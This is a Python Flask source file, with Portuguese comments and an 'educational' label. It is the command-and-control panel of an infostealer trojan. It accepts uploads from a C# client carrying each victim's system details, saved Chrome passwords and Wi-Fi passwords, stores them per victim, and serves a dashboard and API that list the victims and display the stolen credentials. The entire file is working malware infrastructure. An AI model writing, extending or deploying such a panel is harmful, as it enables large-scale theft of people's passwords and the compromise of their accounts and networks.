"""
============================================
  PAINEL DE CONTROLE - Servidor Web
  Versão educacional - Engenharia de Software
  
  Recebe dados do client C# e exibe
  em um dashboard bonito no navegador.
============================================
"""

import os
import json
import base64
import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory
import threading

app = Flask(__name__)
app.secret_key = 'trojan_educacional_key'

# Diretório para salvar os dados
DATA_DIR = 'collected_data'
os.makedirs(DATA_DIR, exist_ok=True)

# Banco de dados em memória (vítimas conectadas)
victims = {}
victims_lock = threading.Lock()


# ============================================
# API - Recebe dados do client
# ============================================
@app.route('/api/data', methods=['POST'])
def receive_data():
    """Recebe dados enviados pelo client C#."""
    try:
        data = request.get_json()
        hostname = data.get('hostname', 'unknown')
        timestamp = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

        # Salva em arquivo
        victim_dir = os.path.join(DATA_DIR, f"{hostname}_{timestamp}")
        os.makedirs(victim_dir, exist_ok=True)

        # Salva cada tipo de dado
        if data.get('system_info'):
            with open(os.path.join(victim_dir, 'system_info.json'), 'w', encoding='utf-8') as f:
                json.dump(data['system_info'], f, indent=2, ensure_ascii=False)

        if data.get('chrome_passwords'):
            with open(os.path.join(victim_dir, 'chrome_passwords.txt'), 'w', encoding='utf-8') as f:
                f.write(data['chrome_passwords'])

        if data.get('wifi_passwords'):
            with open(os.path.join(victim_dir, 'wifi_passwords.txt'), 'w', encoding='utf-8') as f:
                f.write(data['wifi_passwords'])

        # Atualiza lista de vítimas em memória
        with victims_lock:
            victim_key = f"{hostname}_{timestamp}"
            victims[victim_key] = {
                'hostname': hostname,
                'timestamp': timestamp,
                'ip': request.remote_addr,
                'system_info': data.get('system_info', {}),
                'chrome_passwords': data.get('chrome_passwords', ''),
                'wifi_passwords': data.get('wifi_passwords', ''),
                'dir': victim_dir
            }

        print(f"[+] Dados recebidos de: {hostname} ({request.remote_addr})")
        return jsonify({'status': 'ok', 'message': 'Dados recebidos com sucesso'})

    except Exception as e:
        print(f"[!] Erro ao processar dados: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


# ============================================
# API - Ping do client
# ============================================
@app.route('/api/ping', methods=['GET'])
def ping():
    """Client verifica se o servidor está online."""
    return jsonify({'status': 'online', 'time': datetime.datetime.now().isoformat()})


# ============================================
# DASHBOARD
# ============================================
@app.route('/')
def dashboard():
    """Página principal com o painel de controle."""
    return render_template('index.html')


# ============================================
# API - Lista vítimas
# ============================================
@app.route('/api/victims', methods=['GET'])
def list_victims():
    """Retorna lista de vítimas conectadas."""
    with victims_lock:
        victim_list = []
        for key, victim in victims.items():
            victim_list.append({
                'id': key,
                'hostname': victim['hostname'],
                'timestamp': victim['timestamp'],
                'ip': victim['ip'],
                'has_chrome_pw': bool(victim['chrome_passwords']),
                'has_wifi_pw': bool(victim['wifi_passwords'])
            })
        return jsonify({'victims': victim_list})


# ============================================
# API - Detalhes de uma vítima
# ============================================
@app.route('/api/victim/<victim_id>', methods=['GET'])
def victim_details(victim_id):
    """Retorna detalhes de uma vítima específica."""
    with victims_lock:
        if victim_id in victims:
            victim = victims[victim_id]
            return jsonify({
                'system_info': victim.get('system_info', {}),
                'chrome_passwords': victim.get('chrome_passwords', ''),
                'wifi_passwords': victim.get('wifi_passwords', '')
            })
        else:
            return jsonify({'error': 'Vítima não encontrada'}), 404


# ============================================
# INICIAR
# ============================================

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("=" * 50)
    print("  PAINEL DE CONTROLE")
    print("=" * 50)
    print(f"[+] Servidor rodando em: http://0.0.0.0:{port}")
    print(f"[+] Dashboard: http://localhost:{port}")
    print(f"[+] Client envia para: http://SEU_URL:{port}/api/data")
    print(f"[+] Dados salvos em: ./{DATA_DIR}/")
    print("=" * 50)
    print()

    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
